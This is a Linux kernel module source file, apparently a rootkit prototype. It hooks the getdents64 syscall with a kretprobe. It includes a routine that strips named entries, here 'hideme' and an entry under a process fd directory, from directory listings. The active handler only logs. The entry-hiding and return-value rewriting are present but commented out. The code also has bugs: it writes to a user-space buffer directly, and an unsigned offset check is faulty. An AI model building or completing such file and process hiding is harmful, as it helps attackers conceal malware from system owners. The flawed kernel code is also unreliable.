#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/kthread.h>
#include <linux/kprobes.h>
#include <linux/fprobe.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fdtable.h>

/// const file name to hide
const char* hide_file_name = "hideme";
const char* hide_pid_path = "/3504/fd";

typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);

/// hide directory entries from result buffer
/// @buffer is the result buffer to store @refitem linux_dirent64
/// @size of buffer in bytes
/// @return new buffer size
static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data);


static struct kretprobe kretp = {
        .maxactive = 20
};

struct getdent64_arguments {
    unsigned int fd;
    __user void* buffer_ptr;
    unsigned int count;
};

static bool hide_entry_by_name(struct linux_dirent64* entry, void* data){
    const char* str = data;
    if(strcmp(entry->d_name, str) == 0){
        return true;
    }
    return false;
}


static int handler_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct getdent64_arguments* args;
    // syscall wrappers __x64_sys_* gets only ptr to regs
    regs = ((struct pt_regs*)regs->di);

    if (!current->mm)
        return 1;	/* Skip kernel threads */


    args = (struct getdent64_arguments*)ri->data;

    //unsigned long syscall = regs->orig_ax;
    args->fd = regs->di; // 0
    args->buffer_ptr = (void*)regs->si; // 1
    args->count = regs->dx; // 2

    return 0;
}

static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
    unsigned long retval = regs_return_value(regs);

    pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, retval);

    if(retval < 100 && retval > 0 ){
        __user struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr);

        //pr_info("first name is %s\n", current_ent->d_name);
    }

//    unsigned long offset = 0;
//
//    if(retval < 200){
//        // find entry to hide
//        while(offset < retval){
//            struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
//            pr_info("found %s\n", current_ent->d_name);
//
////            if(strcmp(current_ent->d_name, hide_file_name) == true){
////                pr_info("hide %s\n", current_ent->d_name);
////                break;
////            }
//            offset += current_ent->d_reclen;
//        }
//    }


//    // filter by name
//    unsigned int new_size = hide_entry(args->buffer_ptr, retval, hide_entry_by_name, (void*)hide_file_name);
//    regs_set_return_value(regs, new_size);

//    // filter socket
//    char fd_path[256];
//
//    struct file* file = files_lookup_fd_raw(current->files, args->fd);
//    struct dentry* dentry = file->f_path.dentry;
//    char* path = dentry_path_raw(dentry, fd_path, 256);
//
//    struct super_block* sb= file->f_path.mnt->mnt_sb;
//
//    // checking if the vfs is proc
//    if(strcmp(sb->s_id, "proc") == 0){
//        if(strcmp(path, hide_pid_path) == 0){
//            pr_info("found usage in path=%s\n", path);
//
//            {
//                unsigned long offset = 0;
//
//                // find entry to hide
//                while(offset < retval){
//                    struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
//                    pr_info("name=%s\n", current_ent->d_name);
//                    offset += current_ent->d_reclen;
//                }
//            }
//
//            unsigned int new_size2 = hide_entry(args->buffer_ptr, new_size, hide_entry_by_name, "3");
//            regs_set_return_value(regs, new_size2);
//        }
//    }

    return 0;
}

static int __init entrypoint(void)
{
    kretp.entry_handler = handler_pre;
    kretp.handler = handle_post;
    kretp.kp.symbol_name = "__x64_sys_getdents64";
    kretp.data_size = sizeof(struct getdent64_arguments);

    if (register_kretprobe(&kretp) < 0) {
        pr_info("register_kretprobe failed\n");
        return -1;
    }
    pr_info("kretprobe registered\n");
    return 0;
}

static void __exit cleanup(void){
    pr_info("Missed probing %d instances of %s\n",
            kretp.nmissed, kretp.kp.symbol_name);

    unregister_kretprobe(&kretp);
    pr_info("Yarin Module cleanup\n");
}

module_init(entrypoint)
module_exit(cleanup)
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yarin");
MODULE_DESCRIPTION("Test Module");

unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data){
    unsigned long offset = 0;

    unsigned long hide_entry_offset = -1;
    unsigned long hide_entry_size = 0;

    // find entry to hide
    while(offset < size){
        struct linux_dirent64* current_ent = (struct linux_dirent64* )(buffer + offset);
        if(entryFilter(current_ent, data) == true){
            hide_entry_offset = offset;
            hide_entry_size = current_ent->d_reclen;
            pr_info("hiding %s\n", current_ent->d_name);
            break;
        }
        offset += current_ent->d_reclen;
    }

    if(hide_entry_offset > 0) {
        // offset     2
        // nextOffset 3
        // [0, 1, 2, 3, 4]
        // -----[        ] dest
        // --------[     ] source
        memcpy(buffer + hide_entry_offset,  buffer + hide_entry_offset + hide_entry_size, (size - hide_entry_offset - hide_entry_size));
        return size - hide_entry_size;
    }

    return size;
}